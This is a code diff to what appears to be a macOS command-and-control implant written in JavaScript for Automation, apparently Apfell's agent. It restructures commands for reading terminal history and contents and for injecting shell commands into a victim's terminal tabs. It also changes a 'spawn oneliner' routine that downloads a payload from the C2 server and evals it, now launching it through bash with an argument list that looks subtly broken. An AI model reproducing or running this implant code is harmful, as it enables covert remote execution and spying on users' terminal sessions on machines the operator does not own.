@@ -435,30 +435,25 @@ sleepWakeUp = function(t){
 					output = get_system_info("jxa");
 				}
 			}
-			else if(command == "terminals"){
+			else if(command == "terminals_read"){
 				//this is the terminals section (read or send data to)
 				split_params = params.split(" ");
-				if(split_params[0] == "read"){
-					//this means command is: terminals read [history] [contents]
-					var history = false;
-					var contents = false;
-					if(split_params.includes('history')){
-						history = true;
-					}
-					if(split_params.includes('contents')){
-						contents = true;
-					}
-					output = list_terminal_info(history, contents);
-				}
-				else if(split_params[0] == "send"){
-					//this means command is: terminals send win tab command(s)
-					//  the required information can be gained from the 'terminals read' command
-					output = shell_in_term_tab(split_params[1], split_params[2], split_params.slice(3, ).join(" "));
-				}
-				else{
-					output = "unknown terminals command";
-				}
-
+                //this means command is: terminals_read [history] [contents]
+                var history = false;
+                var contents = false;
+                if(split_params.includes('history')){
+                    history = true;
+                }
+                if(split_params.includes('contents')){
+                    contents = true;
+                }
+                output = list_terminal_info(history, contents);
+			}
+			else if(command == "terminals_send"){
+			    split_params = params.split(" ");
+			    //this means command is: terminals_send {win} {tab} {command(s)}
+                //  the required information can be gained from the 'terminals_read' command
+                output = shell_in_term_tab(split_params[1], split_params[2], split_params.slice(3, ).join(" "));
 			}
 			else if(command == "spawn"){
 			    split_params = params.split(" ");
@@ -466,8 +461,8 @@ sleepWakeUp = function(t){
 			        if(split_params[1] == "oneliner"){
 			            if(split_params[2] == "apfell-jxa"){
 			                full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
-                            path = "/usr/bin/osascript"
-                            args = ['-l','JavaScript','-e']
+                            path = "/bin/bash"
+                            args = ['-c', '/usr/bin/osascript', '-l','JavaScript','-e']
                             command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
                             command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));"
                             args.push(command);
